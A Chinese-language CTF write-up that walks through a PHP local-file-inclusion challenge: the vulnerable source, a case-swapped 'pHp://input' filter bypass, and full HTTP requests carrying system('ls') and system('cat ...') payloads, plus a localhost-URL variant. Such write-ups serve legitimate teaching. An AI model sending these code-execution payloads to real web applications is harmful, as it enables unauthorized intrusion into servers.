# Web_php_include

难度系数: 2.0

```php
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

使用 `GET` 方式上传的 `hello` 直接显示它的内容. 同样使用 `GET` 方式上传的 `page` 会经过检查 `strstr($page, "php://")`. 如果包含任何 `php://` 都会删除. 然后读取文件 `page` 的内容.

我们可以简单绕过 `strstr()` 使用大小写, 利用伪协议执行 `Linux` 命令.

```
GET /?hello=1%0a&page=pHp://input HTTP/1.1
Host: 111.200.241.244:63890
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 22

<?php system("ls"); ?>
```

得到 `flag` 文件 `fl4gisisish3r3.php`.

最后只需要读取这文件:

```
GET /?hello=1%0a&page=pHp://input HTTP/1.1
Host: 111.200.241.244:63890
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 42

<?php system("cat fl4gisisish3r3.php"); ?>
```

`xctf` 的解题方式很漂亮: 

`?page=http://127.0.0.1/index.php/?hello=<?system("ls");?>`

利用 `hello` 执行命令写在 `http://127.0.0.1/index.php` 上, 然后用 `include($page)` 读取内容.
